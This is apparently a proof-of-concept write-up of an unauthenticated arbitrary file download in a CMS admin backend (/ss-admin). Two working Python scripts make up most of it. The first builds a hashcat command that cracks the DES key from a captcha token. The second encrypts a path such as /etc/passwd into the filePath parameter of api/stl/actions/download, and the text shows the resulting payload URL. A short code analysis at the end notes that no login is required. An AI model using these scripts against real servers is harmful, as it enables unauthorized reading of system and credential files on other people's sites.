Visit the backend at http://ip/ss-admin/login/
<img width="693" height="446" alt="image" src="https://github.com/user-attachments/assets/86917f27-4e55-47cb-9bb3-db5e7202477f" />

Right-click on "Check" and navigate to the verification code area as shown below:

<img width="691" height="224" alt="image" src="https://github.com/user-attachments/assets/37ec08d3-e8b0-44a0-860e-0bf081276aed" />

Copy the value of the token again:
y5WWupq9Uh0slash0X9rQ66OSpKxMH811v8xERFkSwjNy4ZvHr7YQDiEFDM3SocOEZkWZdtrCienNat0i0slash0NPC20slash0Uhtyw0equals00equals00secret0
Use the following Python script to generate the hashcat command
```shell
import base64
def b64_de_replace(txt):
    txt = txt.replace('0secret0', '') 
    txt = txt.replace('0add0', '+').replace('0equals0', '=').replace('0and0', '&')
    txt = txt.replace('0question0', '?').replace('0quote0', "'").replace('0slash0', '/')
    return txt
def bxor(b1, b2):
    result = bytearray()
    for a, b in zip(b1, b2):
        result.append(a ^ b)
    return bytes(result)
def generate_hashcat_command(ct, pt_first_block, iv):
    cleaned_ct = b64_de_replace(ct)
    decoded_ct = base64.b64decode(cleaned_ct)
    first_block_ct = decoded_ct[:8]
    ct_hex = first_block_ct.hex()
    intermediate = bxor(pt_first_block, iv)
    intermediate_hex = intermediate.hex()
    command = (
        f"hashcat -m 14000 {ct_hex}:{intermediate_hex} "
        f"-a 3 \"?h?h?h?h?h?h?h?h\" --force"
    )
    return command
if __name__ == "__main__":
    ct = 'y5WWupq9Uh0slash0X9rQ66OSpKxMH811v8xERFkSwjNy4ZvHr7YQDiEFDM3SocOEZkWZdtrCienNat0i0slash0NPC20slash0Uhtyw0equals00equals00secret0'  #Replace with the token value of the verification code just now
    pt_first_block = b'{\n  "val'  
    iv = b'\x12\x34\x56\x78\x90\xab\xcd\xef'  
    # Generate hashcat command
    command = generate_hashcat_command(ct, pt_first_block, iv)
    print("Please run the following command to crack the DES key:")
    print(command)
```
  
<img width="692" height="81" alt="image" src="https://github.com/user-attachments/assets/2d05e1a7-b3b9-4e80-b695-56b9614c9a46" />

Use hashcat tool to explode the equivalent key:

<img width="692" height="477" alt="image" src="https://github.com/user-attachments/assets/1d3c2596-d06f-428e-9161-9722460358fa" />

Equivalent Key:d3a3d312

Then use the following Python script to generate the API path for downloading any file
```shell
from Crypto.Cipher import DES
import base64
def encrypt_string_by_secret_key(input_string, secret_key):
    iv = bytes([0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF])
    secret_key = secret_key[:8]
    try:
        des = DES.new(secret_key.encode('utf-8'), DES.MODE_CBC, iv)
        padding_len = 8 - (len(input_string) % 8)
        input_string_padded = input_string + chr(padding_len) * padding_len
        encrypted_bytes = des.encrypt(input_string_padded.encode('utf-8'))
        base64_encrypted = base64.b64encode(encrypted_bytes).decode('utf-8')
        base64_encrypted = base64_encrypted.replace("+", "0add0") \
            .replace("=", "0equals0") \
            .replace("&", "0and0") \
            .replace("?", "0question0") \
            .replace("'", "0quote0") \
            .replace("/", "0slash0")
        encrypt_indicator = "0secret0"
        return base64_encrypted + encrypt_indicator
    except Exception as e:
        print("DES Encryption failed:", str(e))
        return None
# 示例数据
# file_path = r"C:\Windows\win.ini"  # The path to download the file
file_path = r"/etc/passwd"  # The path to download the file
secret_key = "d3a3d312" #Replace with the equivalent key generated earlier
# 加密
encrypted_file_path = encrypt_string_by_secret_key(file_path, secret_key)
if encrypted_file_path:
    print("Encryption result:", encrypted_file_path)
    print("payload:","api/stl/actions/download?filePath="+encrypted_file_path)
else:
    print("Encryption failed")
```

<img width="692" height="99" alt="image" src="https://github.com/user-attachments/assets/19c80011-2048-42f3-bc7c-59fee4589d5c" />

visit :http://ip/api/stl/actions/download?filePath=5tckNs4Ydqz58s7VvQ9RxQ0equals00equals00secret0

<img width="692" height="288" alt="image" src="https://github.com/user-attachments/assets/f3e0631f-3fe8-48d1-8f6e-15ef63ef9bfc" />

<img width="1203" height="782" alt="image" src="https://github.com/user-attachments/assets/b614bc35-d167-4edc-97d6-b4ffdba93c22" />


Successfully downloaded passwd file

Vulnerability code analysis

<img width="1853" height="848" alt="image" src="https://github.com/user-attachments/assets/d9067e96-29b6-4647-b70e-f3f0423267d9" />

No administrator login is required here, as long as the decryption of "FilePath" is successful, any file can be downloaded

<img width="1698" height="757" alt="image" src="https://github.com/user-attachments/assets/4465a35f-673b-482f-b94c-4a6becb89dce" />



